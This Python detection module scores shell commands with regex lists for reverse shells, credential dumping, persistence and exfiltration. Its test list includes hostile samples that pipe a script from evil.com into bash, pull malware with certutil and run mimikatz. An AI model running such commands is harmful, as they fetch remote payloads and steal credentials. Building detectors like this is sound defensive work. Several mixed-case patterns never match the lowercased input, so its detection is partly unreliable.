"""
Command Rule Engine
Rule-based detection for malicious shell commands
"""

import re
from typing import Dict, List


OBFUSCATION_PATTERNS = [
    r'cmd\s+/c',
    r'powershell\s+-enc',
    r'powershell\s+-e',
    r'bash\s+-c',
    r'sh\s+-c',
    r'cmd\s+/k',
    r'python\s+-c\s+exec',
    r'perl\s+-e',
    r'ruby\s+-e',
    r'php\s+-r',
    r'eval\s*\(',
    r'exec\s*\(',
    r'FromBase64String',
    r'Invoke-Expression',
    r'IEX\s+',
]

REMOTE_DOWNLOAD_PATTERNS = [
    r'curl\s+http',
    r'curl\s+https',
    r'wget\s+http',
    r'wget\s+https',
    r'Invoke-WebRequest',
    r'Invoke-RestMethod',
    r'bitsadmin',
    r'certutil.*-urlcache',
    r'certutil.*-f',
    r'download\.file\(',
    r'DownloadFile\(',
    r'wget\s+-O',
    r'curl\s+-o',
    r'wget\s+-o',
]

REVERSE_SHELL_PATTERNS = [
    r'/dev/tcp/',
    r'nc\s+-e',
    r'nc\s+.*-e',
    r'bash\s+-i.*&',
    r'bash\s+.*>&',
    r'socket\.connect\(',
    r'fsockopen\(',
    r'socket_create\(',
    r'perl\s+-MIO',
    r'php.*fsockopen',
    r'python.*socket.*connect',
    r'mkfifo',
]

PRIVILEGE_ESCALATION_PATTERNS = [
    r'sudo\s+su',
    r'sudo\s+-s',
    r'sudo\s+bash',
    r'chmod\s+777',
    r'chmod\s+0',
    r'chmod\s+4755',
    r'whoami\s+/priv',
    r'whoami\s+/all',
    r'whoami\s+/groups',
    r'net\s+user\s+.*add',
    r'net\s+localgroup',
    r'psexec.*-s',
    r'psexec.*-d',
    r'getprivs',
    r'seed',
]

PERSISTENCE_PATTERNS = [
    r'reg\s+add.*Run',
    r'reg\s+add.*\\Run',
    r'reg\s+add.*\\CurrentVersion',
    r'schtasks.*create',
    r'crontab\s+-e',
    r'@reboot',
    r'launchctl\s+load',
    r'launchctl\s+unload',
    r'Set-ItemProperty.*Run',
    r'Set-MpPreference.*Disable',
    r'autostart',
]

RECONNAISSANCE_PATTERNS = [
    r'whoami',
    r'ipconfig',
    r'ipconfig\s+/all',
    r'netstat\s+-an',
    r'netstat\s+-ano',
    r'netstat\s+-a',
    r'systeminfo',
    r'tasklist',
    r'dir\s+C:',
    r'dir\s+C:\\',
    r'cat\s+/etc/passwd',
    r'cat\s+/etc/shadow',
    r'arp\s+-a',
    r'nbtstat',
    r'nslookup',
    r'ping\s+-n',
    r'tracepath',
    r'nmap',
    r'scan',
]

CREDENTIAL_ACCESS_PATTERNS = [
    r'mimikatz',
    r'sekurlsa',
    r'LaZagne',
    r'pwdump',
    r'fgdump',
    r'wce-',
    r'pwdump',
    r'reg\s+save.*SAM',
    r'reg\s+save.*SYSTEM',
    r'lsass',
    r'procdump',
    r'gsecdump',
    r'cachedump',
    r'logonsessions',
]

FILE_OPS_PATTERNS = [
    r'echo\s+.*>>',
    r'echo\s+.*>',
    r'>\s*/tmp',
    r'Out-File',
    r'Set-Content',
    r'copy\s+.*system',
    r'move\s+.*system',
    r'certutil.*-encode',
    r'certutil.*-decode',
    r'del\s+/[qf]',
    r'rm\s+-rf',
    r'shadow',
    r'authorized_keys',
]

LATERAL_MOVEMENT_PATTERNS = [
    r'psexec',
    r'wmic.*node',
    r'winrm',
    r'Invoke-Command.*ComputerName',
    r'net\s+use.*\\\\',
    r'smbexec',
    r'winexe',
    r'atexec',
    r'csync',
]

EXFILTRATION_PATTERNS = [
    r'curl\s+-X\s+POST',
    r'wget.*--post',
    r'Invoke-WebRequest.*-Method\s+POST',
    r'ftp\s+-s',
    r'nc\s+.*<',
    r'scp.*@',
    r'rsync',
    r'exfil',
    r'uploader',
]

DISABLE_SECURITY_PATTERNS = [
    r'netsh.*firewall.*off',
    r'netsh.*advfirewall.*off',
    r'Set-MpPreference.*DisableRealtimeMonitoring',
    r'sc\s+stop',
    r'service\s+stop.*defend',
    r'bcdedit.*nointegritychecks',
    r'reg.*Disable.*Antivirus',
    r'tamper',
    r'bypass.*AV',
]


def calculate_score(command: str) -> Dict:
    """Calculate rule-based score for a command."""
    command_lower = command.lower()
    
    score = 0
    signals = []
    
    for pattern in OBFUSCATION_PATTERNS:
        if re.search(pattern, command_lower):
            score += 5
            signals.append(("obfuscation", 5, pattern))
            break
    
    for pattern in REMOTE_DOWNLOAD_PATTERNS:
        if re.search(pattern, command_lower):
            score += 4
            signals.append(("remote_download", 4, pattern))
            break
    
    for pattern in REVERSE_SHELL_PATTERNS:
        if re.search(pattern, command_lower):
            score += 5
            signals.append(("reverse_shell", 5, pattern))
            break
    
    for pattern in PRIVILEGE_ESCALATION_PATTERNS:
        if re.search(pattern, command_lower):
            score += 4
            signals.append(("privilege_escalation", 4, pattern))
            break
    
    for pattern in PERSISTENCE_PATTERNS:
        if re.search(pattern, command_lower):
            score += 4
            signals.append(("persistence", 4, pattern))
            break
    
    for pattern in CREDENTIAL_ACCESS_PATTERNS:
        if re.search(pattern, command_lower):
            score += 5
            signals.append(("credential_access", 5, pattern))
            break
    
    for pattern in LATERAL_MOVEMENT_PATTERNS:
        if re.search(pattern, command_lower):
            score += 4
            signals.append(("lateral_movement", 4, pattern))
            break
    
    for pattern in EXFILTRATION_PATTERNS:
        if re.search(pattern, command_lower):
            score += 3
            signals.append(("exfiltration", 3, pattern))
            break
    
    for pattern in DISABLE_SECURITY_PATTERNS:
        if re.search(pattern, command_lower):
            score += 4
            signals.append(("disable_security", 4, pattern))
            break
    
    if re.search(r'base64\s+-d|FromBase64String|-enc\s+[A-Za-z0-9+/=]', command_lower):
        score += 3
        signals.append(("base64_encoding", 3))
    
    if re.search(r'eval|exec|system\(|shell_exec\(|passthru\(|popen\(', command_lower):
        score += 3
        signals.append(("code_execution", 3))
    
    if 'http://' in command_lower or 'https://' in command_lower:
        url_count = command_lower.count('http')
        if url_count > 1:
            score += 2
            signals.append(("multiple_urls", 2))
    
    suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', '.pw', '.cc']
    if any(tld in command_lower for tld in suspicious_tlds):
        score += 2
        signals.append(("suspicious_tld", 2))
    
    return {
        "rule_score": score,
        "signals": signals[:10],
        "is_suspicious": score >= 4
    }


def check_command(command: str) -> Dict:
    """Full rule engine check for a command."""
    result = calculate_score(command)
    
    if result["rule_score"] >= 8:
        prediction = "malicious"
        confidence = min(0.6 + (result["rule_score"] - 8) * 0.05, 0.95)
    elif result["rule_score"] >= 4:
        prediction = "suspicious"
        confidence = min(0.3 + result["rule_score"] * 0.08, 0.7)
    else:
        prediction = "legitimate"
        confidence = 0.6
    
    return {
        "prediction": prediction,
        "confidence": round(confidence, 4),
        "rule_score": result["rule_score"],
        "signals": [(s[0], s[1]) for s in result["signals"]]
    }


def get_threat_level(score: int) -> str:
    """Get threat level description."""
    if score >= 8:
        return "HIGH"
    elif score >= 4:
        return "MEDIUM"
    else:
        return "LOW"


if __name__ == "__main__":
    test_commands = [
        "cmd /c whoami",
        "powershell -enc SGVsbG8gV29ybGQh",
        "curl http://evil.com/payload.sh | bash",
        "mimikatz sekurlsa::logonpasswords",
        "git status",
        "docker ps",
        "python script.py",
        "sudo su",
        "certutil -urlcache -f http://bad.com/malware.exe",
    ]
    
    print("Command Rule Engine Test")
    print("=" * 60)
    
    for cmd in test_commands:
        result = check_command(cmd)
        print(f"\nCommand: {cmd[:50]}")
        print(f"  Prediction: {result['prediction']}")
        print(f"  Confidence: {result['confidence']}")
        print(f"  Rule Score: {result['rule_score']}")
        print(f"  Signals: {result['signals']}")